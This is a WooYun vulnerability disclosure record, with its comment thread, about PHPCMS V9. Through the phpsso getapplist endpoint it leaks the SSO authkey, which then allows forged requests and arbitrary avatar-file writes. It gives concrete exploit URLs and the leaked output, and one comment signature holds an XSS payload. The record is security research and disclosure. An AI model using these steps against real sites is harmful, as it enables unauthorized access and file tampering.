{"id": 1229, "wybug_id": "wooyun-2014-066394", "wybug_title": "PHPCMS V9 一个为所欲为的漏洞", "wybug_corp": "phpcms", "wybug_author": "Map", "wybug_date": "2014-06-27 11:12", "wybug_open_date": "2014-09-22 11:14", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-02：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： 不知道怎么形容这个漏洞，反正大部分情况下可以做的事情很多了。官网注册不上，所以无法官网演示。 详细说明：  安装phpcms的时候会强制安装它的通行证。phpcms/phpsso_server/phpcms/modules/phpsso/index.php里有一段很可怕的代码\n/**\t * 获取应用列表\t */\tpublic function getapplist() {\t\t$applist = getcache('applist', 'admin');\t\texit(serialize($applist));\t}\ncache里是什么内容呢，我们自己去看一下文件：\n<?phpreturn array (  1 =>   array (    'appid' => '1',    'type' => 'phpcms_v9',    'name' => 'phpcms v9',    'url' => 'http://localhost:8038/study/phpcms/',    'authkey' => 'L7UXO1cpUV6QmkX0oeGAXiOdQy6Hmvkr',    'ip' => '',    'apifilename' => 'api.php?op=phpsso',    'charset' => 'gbk',    'synlogin' => '1',  ),);?>\n所以只要我们调用phpsso并且能走到这个方法里，就会突出sso配置的客户端的所有信息，包括authkey。查看通行证代码发现，只要$_POST['data']可以解出来，就可以走下去。\nif(isset($_GET) && is_array($_GET) && count($_GET) > 0) {\t\t\tforeach($_GET as $k=>$v) {\t\t\t\tif(!in_array($k, array('m','c','a'))) {\t\t\t\t\t$_POST[$k] = $v;\t\t\t\t}\t\t\t}\t\t}\nGET全付给POST\nif(isset($_POST['data'])) {\t\t\tparse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);\t\t\t\t\t\t\t\tif(empty($this->data) || !is_array($this->data)) {\t\t\t\texit('0');\t\t\t}\t\t} else {\t\t\texit('0');\t\t}\nok，我们怎么拿到这个$_POST['data']，用户上传头像的页面里就有。注册登录后访问http://localhost:8038/study/phpcms/index.php?m=member&c=index&a=account_manage_avatar&t=1查看源文件：\n\n拿到这个：aHR0cDovL2xvY2FsaG9zdDo4MDM4L3N0dWR5L3BocGNtcy9waHBzc29fc2VydmVyL2luZGV4LnBocD9tPXBocHNzbyZjPWluZGV4JmE9dXBsb2FkYXZhdGFyJmF1dGhfZGF0YT12PTEmYXBwaWQ9MSZkYXRhPWU1YzJWQU1HVVFaUkFRa0lVUVFLVndGVUFnSUNWZ0FJQWxkVkJRRkREUVZjVjBNVVFHa0FReFZaWmxNRUdBOSUyQkRqWm9LMUFIUm1Vd0JHY09YVzVVRGdRaEpEeGFlUVZuR0FkeFZSY0tRQQ==解除base64_decode编码得http://localhost:8038/study/phpcms/phpsso_server/index.php?m=phpsso&c=index&a=uploadavatar&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9%2BDjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQA将url里的uploadavatar换成：getapplist得：http://localhost:8038/study/phpcms/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9%2BDjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQA访问得：a:1:{i:1;a:9:{s:5:\"appid\";s:1:\"1\";s:4:\"type\";s:9:\"phpcms_v9\";s:4:\"name\";s:9:\"phpcms v9\";s:3:\"url\";s:35:\"http://localhost:8038/study/phpcms/\";s:7:\"authkey\";s:32:\"L7UXO1cpUV6QmkX0oeGAXiOdQy6Hmvkr\";s:2:\"ip\";s:0:\"\";s:11:\"apifilename\";s:17:\"api.php?op=phpsso\";s:7:\"charset\";s:3:\"gbk\";s:8:\"synlogin\";s:1:\"1\";}}和我们想的一样，authkey在里面：s:7:\"authkey\";s:32:\"L7UXO1cpUV6QmkX0oeGAXiOdQy6Hmvkr\"拿到这个key已经可以想做什么想什么了，sso体系里的东西都可以做了。\n解密出来的东西不受控制，可以包含null截断，也可以包含单双引号\n举个例子：/phpcms/phpsso_server/phpcms/modules/phpsso/index.php内：public function uploadavatar() 写的$this->uid = $this->data['uid']; //uid来自解密出来的uid$this->avatardata = $this->data['avatardata']; //数据内容来自解密出来的数据内容……$dir = $avatarfile.$dir1.'/'.$dir2.'/'.$this->uid.'/';//目录名里引用了来自解密内容的uid……$filename = $dir.'180x180.jpg';//文件名又来自引用了解密uid内容的$dir变量$fp = fopen($filename, 'w');fwrite($fp, $this->avatardata);fclose($fp);文件写入了，反正是想做什么做什么。   漏洞证明：  如上。   修复方案：  不要过分信任自己的加密解密机制，要小心处理每个过程。   版权声明：转载请注明来源 Map@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-22 11:14 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-27 11:13 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  为所欲为    \n     2014-06-27 11:15 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  奸淫掳掠    \n     2014-06-27 11:16 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  为所欲为？是我想的那样么？    \n     2014-06-27 11:19 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  关注    \n     2014-06-27 11:30 |    \t\tquanxian \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:2        | This is QuanXian.)\t\t \n  官网注册不上，所以无法官网演示。phpcms:评分5分    \n     2014-06-27 11:36 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  猥琐欲为    \n     2014-06-27 11:41 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  比@z7y的长相还要为所欲为么？    \n     2014-06-27 11:49 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  为所欲为 是什么姿势。就是所有姿势想上就上是吧！！！！    \n     2014-06-27 11:58 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  为所欲为    \n     2014-06-27 14:28 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  为所欲为 关注 话说主页为毛看不到？    \n     2014-06-27 15:45 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  为所欲为是我想象的那样子吗？    \n     2014-06-27 16:44 |    \t\t李白 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:29        )\t\t \n  感觉洞主是4个洞要上100Rank了    \n     2014-06-27 16:48 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  打雷啦~下雨啦~收衣服啦~洞主我觉得咱俩要悲剧了 phpcms是不来认领的节奏啊，双倍rank和WB就要擦肩而过了    \n     2014-06-27 17:02 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @索马里的海贼 oh no！    \n     2014-06-27 17:26 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  膜拜LZ  @李白 让struts2情何以堪    \n     2014-06-27 17:29 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  LZ屌爆了，每个漏洞都是20rank，膜拜    \n     2014-07-02 12:47 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  无影响厂商忽略    \n     2014-07-02 13:40 |    \t\tquanxian \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:2        | This is QuanXian.)\t\t \n  无影响厂商忽略     \n     2014-07-02 13:54 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  没节操    \n     2014-07-02 14:36 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  @zeracker 节操为何物。无影响厂商忽略    \n     2014-07-02 17:15 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  果断收藏，坐等公开    \n     2014-07-02 19:29 |    \t\t楼下小黑 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 高智商白痴)\t\t \n  不明觉屌    \n     2014-07-02 20:54 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  果然悲剧了。。。一起@疯狗@xsser求补rank吧    \n     2014-07-02 21:07 |    \t\t鱼化石 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:18        | 介绍不能为空)\t\t \n  果断忽略    \n     2014-07-03 00:58 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-07-11 12:19 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  貌似洞主提的“解密出来的东西不受控制，可以包含null截断，也可以包含单双引号” 有点点问题。因为解密用到了parse_str() 不知道洞主当时有没有测试 ：）    \n     2014-07-11 13:02 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @乌云合作伙伴-知道创宇 漏洞还没有公开呢。。这么点出来真的好么。。    \n     2014-07-11 14:42 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  @索马里的海贼 你知道我说的啥？这个和漏洞没有关系，只是漏洞利用有关    \n     2014-07-11 15:11 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @乌云合作伙伴-知道创宇 唉。。phpcms用到parse_str的地方不超过15处 再加上前面那句“解密出来的东西不受控制”,可以联想到前面有解密函数，大概翻一下源码有3个地方，分别是两处sys_auth和一处uc的authcode。sys_auth正好我发的漏洞分析过了。uc这个当时没注意 是不是UC_KEY没初始化呢，或者洞主跟我一样有特别的方法搞到sys_auth的key了呢，再深挖一下也许就有眉目了哦。。。当然以上仅为不负责任的猜测。所以你看，还是能联想到不少东西的。    \n     2014-07-11 16:29 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @乌云合作伙伴-知道创宇 你说的对，其实发完当时我就觉得自己错了，parse_str应该也是首先受该服务器的magic_quote_gpcs的影响的，如果当magic_quote_gpcs为off的情况下，包含'\\是没有问题的，但是为on的话，应当是被转义的    \n     2014-07-11 16:33 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @乌云合作伙伴-知道创宇 如果我理解上有什么问题，欢迎亲和我分享一下你的东西，我确实很多地方不足也挺表面，谢谢。另外也谢谢@索马里的海贼     \n     2014-07-11 21:07 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  @Map 一看洞主发的那些漏洞，就知道水平很牛啊！大家多交流 ：）    \n     2014-07-14 23:24 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  漏洞是黑哥吗？    \n     2014-07-14 23:24 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  楼上 打错字了    \n     2014-07-14 23:32 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  @只发通用型 黑哥？刺总？吴翰清？    \n     2014-07-25 13:56 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @乌云合作伙伴-知道创宇  看到详情了 果然和我29楼说的一样 所以对你那句“你知道我说的啥？” 我现在可以说了  \"YES I DO \" 你的能力分析不出来不代表别人分析不出来 别整天一副盛气凌人的样子    \n     2014-07-29 11:24 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  都是牛人啊    \n     2014-07-29 16:38 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  @索马里的海贼 汗～～ 好吧你如果觉得我回复的语气太“盛气凌人”不好，那我道歉吧！@只发通用型 你猜？    \n     2014-07-30 13:37 |    \t\tFireweed \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:14        | Show me the #)\t\t \n  额     \n     2014-08-21 14:59 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  $filename那个地方无法截断。不知道是不是我太菜了还是误报？    \n     2014-08-21 15:16 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @kimdle 这个问题前面我和知道创宇已经讨论过了，但是你可以找到可用的地方。    \n     2014-08-24 10:17 |    \t\t游戏 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 一个大白菜)\t\t \n  好吧，我想歪了    \n     2014-08-27 09:07 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  @Map 可否指点一下    \n     2014-09-19 21:08 |    \t\tYHHK \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:5        | love hacker!love technology!)\t\t \n  POST过去的无法截断、、、、    \n     2014-09-22 13:45 |    \t\t小卖部部长 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:3        | 别拿部长不当干部！)\t\t \n  好高深。。。先留个位子    \n     2014-11-30 18:01 |    \t\t消逝文字 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | 永久的菜鸟一枚)\t\t \n    拿到 key  后 下一步 如何操作呢    \n     2015-06-29 21:27 |    \t\tQ1NG \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 临 兵 斗 者 皆 阵 列 前 行 !)\t\t \n  mark!     \n     2015-08-05 16:15 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  学习了！谢谢洞主    \n     2015-08-05 16:16 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  @消逝文字 很多加密函数跟key有关，比如cookie    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}